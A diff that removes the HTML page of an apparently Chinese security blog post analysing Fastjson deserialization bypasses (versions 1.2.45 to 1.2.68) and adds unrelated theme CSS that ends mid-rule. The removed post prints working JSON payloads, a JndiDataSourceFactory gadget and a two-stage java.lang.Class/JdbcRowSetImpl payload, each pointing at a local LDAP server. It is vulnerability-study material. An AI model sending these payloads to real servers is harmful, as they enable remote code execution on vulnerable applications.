@@ -1,127 +1,88 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="RoboTerh"><meta name="copyright" content="RoboTerh"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>Fastjson反序列化漏洞2 | RoboTerh</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
-  [".post-card",".post-content img"].forEach((target)=> {
-    ScrollReveal().reveal(target);
-  })
+.post-block {
+  color: var(--hty-text-color);
+  margin: 0 1rem;
+  padding: 1rem;
+  background-color: var(--post-block-bg-color);
+mobile()
 }
-document.addEventListener("DOMContentLoaded", initScrollReveal);
-document.addEventListener("pjax:success", initScrollReveal);
-</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
-    const Yun = window.Yun || {};
-    window.CONFIG = {"hostname":"roboterh.github.io","root":"/","title":["ROBO","TERH","BLOG","小站"],"version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
-  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"QzEMTRDcJM476WmFbFsyqtOV-MdYXbMMI","app_key":"Ovrs8D1mvkchhDyViQ6oVoQq","server_url":"https://roboterh.github.io"}</script><script defer src="/js/analytics/leancloud-visitors.js"></script><meta name="description" content="fastjson 1.2.45一个黑名单绕过 &amp;#123;     &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,     &quot;properties&quot;:&amp;#123;         &quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:23457&#x2F;Command8&quot;     &amp;#125; &amp;#125;">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Fastjson反序列化漏洞2">
-<meta property="og:url" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/index.html">
-<meta property="og:site_name" content="RoboTerh">
-<meta property="og:description" content="fastjson 1.2.45一个黑名单绕过 &amp;#123;     &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,     &quot;properties&quot;:&amp;#123;         &quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:23457&#x2F;Command8&quot;     &amp;#125; &amp;#125;">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401175844931.png">
-<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401180817759.png">
-<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401181751319.png">
-<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401184546628.png">
-<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401185205137.png">
-<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401185403893.png">
-<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401185536518.png">
-<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401185840638.png">
-<meta property="article:published_time" content="2022-04-01T04:31:52.000Z">
-<meta property="article:modified_time" content="2022-04-01T12:00:46.310Z">
-<meta property="article:author" content="RoboTerh">
-<meta property="article:tag" content="反序列化漏洞">
-<meta property="article:tag" content="java代码审计">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401175844931.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="RoboTerh"><img width="96" loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/8@XK~G6IIG(3~I6J~C6M4JB.png" alt="RoboTerh"><span class="site-author-status" title="wwww我好菜">-_-</span></a><div class="site-author-name"><a href="/about/">RoboTerh</a></div><span class="site-name">RoboTerh</span><sub class="site-subtitle"></sub><div class="site-desciption">无聊的时候记录记录自己的学习啊</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">26</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">10</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">17</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/F0A770ED0C75BC233DA1034B4C80E8DA.png" title="QQ" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2865153524@qq.com" title="E-Mail" target="_blank" style="color:8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson-1-2-45"><span class="toc-number">1.</span> <span class="toc-text">fastjson 1.2.45</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-25-lt-fastjson-lt-1-2-47"><span class="toc-number">2.</span> <span class="toc-text">1.2.25&lt;&#x3D;fastjson&lt;&#x3D;1.2.47</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson1-2-68"><span class="toc-number">3.</span> <span class="toc-text">fastjson1.2.68</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://RoboTerh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="RoboTerh"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="RoboTerh"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Fastjson反序列化漏洞2</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2022-04-01 12:31:52" itemprop="dateCreated datePublished" datetime="2022-04-01T12:31:52+08:00">2022-04-01</time></div><span class="leancloud_visitors" id="/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/" data-flag-title="Fastjson反序列化漏洞2"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Java/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Java</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">反序列化漏洞</span></a><a class="tag-item" href="/tags/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">java代码审计</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h4 id="fastjson-1-2-45"><a href="#fastjson-1-2-45" class="headerlink" title="fastjson 1.2.45"></a>fastjson 1.2.45</h4><p>一个黑名单绕过</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>
-    <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span><span class="token punctuation">,</span>
-    <span class="token string">"properties"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
-        <span class="token string">"data_source"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="1-2-25-lt-fastjson-lt-1-2-47"><a href="#1-2-25-lt-fastjson-lt-1-2-47" class="headerlink" title="1.2.25&lt;=fastjson&lt;=1.2.47"></a>1.2.25&lt;=fastjson&lt;=1.2.47</h4><p>在这个版本中可以在不开启<code>AutoTypeSupport</code>的情况下，进行反序列化利用</p>
-<p>在这个版本的<code>ParserConfig#checkAutoType</code>中</p>
-<p><img src="image-20220401175844931.png" alt="image-20220401175844931" loading="lazy"></p>
-<p>在<code>AutoType</code>为false的时候，前面如果为true的if语句就跳过了，但是在进入第二个如果其为false的if语句之前，尝试使用<code>TypeUtils#getClassFromMapping</code>和<code>deserializers.findClass</code>来查找需要反序列化的类，如果找到，就不会进入第二个语句</p>
-<p>这个链子主要是在<code>TypeUtils#getClassFromMapping</code>这里做文章，但是我们也来看看<code>deserializers</code></p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">IdentityHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Type</span><span class="token punctuation">,</span> <span class="token class-name">ObjectDeserializer</span><span class="token punctuation">></span></span> deserializers<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>他是一个<code>IdentityHashMap</code>，可以在里面添加值得方法有</p>
-<ul>
-<li><p><code>getDeserializer</code>: 加载特定类或者有JSONType注解的类</p>
-<p><img src="image-20220401180817759.png" alt="image-20220401180817759" loading="lazy"></p>
-</li>
-<li><p><code>initDeserializers()</code>：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。</p>
-</li>
-<li><p><code>putDeserializer()</code>：被前两个函数调用，我们无法控制入参。</p>
-</li>
-</ul>
-<p>然后看另一个查找类得方法</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//TypeUtils#getClassFromMapping</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">getClassFromMapping</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span>mappings<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>从mappings中取值</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//TypeUtils#mappings</span>
-<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ConcurrentMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span><span class="token punctuation">></span></span> mappings <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcurrentHashMap</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0.75F</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>是一个<code>ConcurrentMap</code>对象</p>
-<p>能够赋值得方法有</p>
-<ul>
-<li><code>addBaseClassMappings()</code>：无入参，加载</li>
-<li><code>loadClass()</code>：关键函数</li>
-</ul>
-<p>这个函数有三个重载</p>
-<p><img src="image-20220401181751319.png" alt="image-20220401181751319" loading="lazy"></p>
-<ul>
-<li><code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache)</code>：调用链均在 <code>checkAutoType()</code> 和 <code>TypeUtils</code> 里自调用，略过。</li>
-<li><code>Class&lt;?&gt; loadClass(String className)</code>：除了自调用，有一个 <code>castToJavaBean()</code> 方法，暂未研究。</li>
-<li><code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader)</code>：方法调用两个参数的重载方法，并添加参数 true ，也就是会加入参数缓存中</li>
-</ul>
-<p>在<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code>这个类是用来处理一些乱七八糟类的反序列化类，其中就包括 <code>Class.class</code> 类，成为了我们的入口。</p>
-<p><img src="image-20220401184546628.png" alt="image-20220401184546628" loading="lazy"></p>
-<p>我们来测试一下子，跟进一下他怎么加载到mappings中的</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">pers<span class="token punctuation">.</span>fastjson</span><span class="token punctuation">;</span>
-
-<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
-
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Fj47_Test</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"java.lang.Class\",\"val\":\"aaaaa\"&#125;"</span><span class="token punctuation">;</span>
-        JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="image-20220401185205137.png" alt="image-20220401185205137" loading="lazy"></p>
-<p>调用链如上</p>
-<p><img src="image-20220401185403893.png" alt="image-20220401185403893" loading="lazy"></p>
-<p>在这里调用了checkAutoType方法进行检查</p>
-<p><img src="image-20220401185536518.png" alt="image-20220401185536518" loading="lazy"></p>
-<p>由于 deserializers 在初始化时将 <code>Class.class</code> 进行了加载，因此使用 findClass 可以找到，越过了后面 AutoTypeSupport 的检查。</p>
-<p><code>DefaultJSONParser.parseObject()</code> 根据不同的 class 类型分配 deserialzer，Class 类型由 <code>MiscCodec.deserialze()</code> 处理</p>
-<p><img src="image-20220401185840638.png" alt="image-20220401185840638" loading="lazy"></p>
-<p>payload:</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>
-	<span class="token string">"RoboTerh"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
-		<span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
-		<span class="token string">"val"</span><span class="token operator">:</span> <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
-	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
-	<span class="token string">"demo"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
-		<span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
-		<span class="token string">"dataSourceName"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:8888/EvilObject"</span><span class="token punctuation">,</span>
-		<span class="token string">"autoCommit"</span><span class="token operator">:</span> <span class="token boolean">true</span>
-	<span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="fastjson1-2-68"><a href="#fastjson1-2-68" class="headerlink" title="fastjson1.2.68"></a>fastjson1.2.68</h4><p>在 1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复，在 <code>MiscCodec</code> 处理 Class 类的地方，设置了cache 为 false ，并且 <code>loadClass</code> 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。</p>
-<p>更新了一个新的安全控制点 safeMode，如果应用程序开启了 safeMode，将在 <code>checkAutoType()</code> 中直接抛出异常，也就是完全禁止 autoType</p>
-<p>这就形成了 <code>Throwable</code> 子类绕过 <code>checkAutoType()</code> 的方式。我们需要找到 <code>Throwable</code> 的子类，这个类的 getter/setter/static block/constructor 中含有具有威胁的代码逻辑。</p>
-<p>与 <code>Throwable</code> 类似地，还有 <code>AutoCloseable</code> ，之所以使用 <code>AutoCloseable</code> 以及其子类可以绕过 <code>checkAutoType()</code> ，是因为 <code>AutoCloseable</code> 是属于 fastjson 内置的白名单中</p>
-</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>RoboTerh</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/" title="Fastjson反序列化漏洞2">https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul><script>document.addEventListener('copy', function (event) {
-  const clipboardData = event.clipboardData || window.clipboardData;
-  if (!clipboardData) { return; }
-  const text = window.getSelection().toString();
-  if (text) {
-    event.preventDefault();
-    clipboardData.setData('text/plain', text + '\n\nPost author: RoboTerh\nPost link: https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/\nCopyright Notice: All articles in this blog are licensed under CC BY-NC-SA 4.0 unless otherwise stated.');
-  }
-});</script></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2022/03/28/DASCTF-X-SU-%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="next" title="DASCTF X SU 三月春季挑战赛复现"><span class="post-nav-text">DASCTF X SU 三月春季挑战赛复现</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> RoboTerh</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>
+.post-body {
+  padding: 0 5rem;
+tablet()
+mobile()
+}
+.post-content {
+  padding: 20px 0px;
+}
+.post-meta {
+  font-size: 14px;
+  color: var(--hty-secondary-text-color);
+}
+.post-meta .icon {
+  margin-bottom: -1px;
+}
+.post-description {
+  font-weight: normal;
+  padding: 0.5rem;
+}
+.post-author {
+  display: flex;
+  justify-content: center;
+}
+.post-author .author-avatar {
+  display: inline-flex;
+  justify-content: center;
+  align-items: center;
+  line-height: 0;
+}
+.post-author .author-avatar img {
+  border-radius: 50%;
+  height: 1rem;
+  width: 1rem;
+  padding: 2px;
+  border: 2px solid #d3d3d3;
+}
+.post-author .author-name {
+  margin-left: 0.5rem;
+  font-size: 1rem;
+}
+.post-meta-item-icon {
+  display: inline-block;
+  color: var(--text-color, --hty-secondary-text-color);
+}
+.post-meta-divider {
+  height: 25px;
+  color: var(--hty-secondary-text-color);
+  margin: 0 0.5rem;
+}
+.post-eof {
+  margin: 50px auto;
+  width: 50%;
+  height: 1px;
+  background: $blue;
+  opacity: 0.1;
+}
+.post-copyright {
+  font-size: 0.9rem;
+  margin: 2rem 0;
+  padding: 0.5rem 1rem;
+  border-left: 4px solid #ff5252;
+  background-color: var(--hty-bg-color);
+  list-style: none;
+  word-break: break-all;
+  position: relative;
+  overflow: hidden;
+}
+.post-copyright::after {
+  position: absolute;
+  color: #fff;
+  background: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 496 512'%3E%3Cpath fill='gray' d='M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z'/%3E%3C/svg%3E");
+  content: ' ';
+  height: 10rem;
+  width: 10rem;
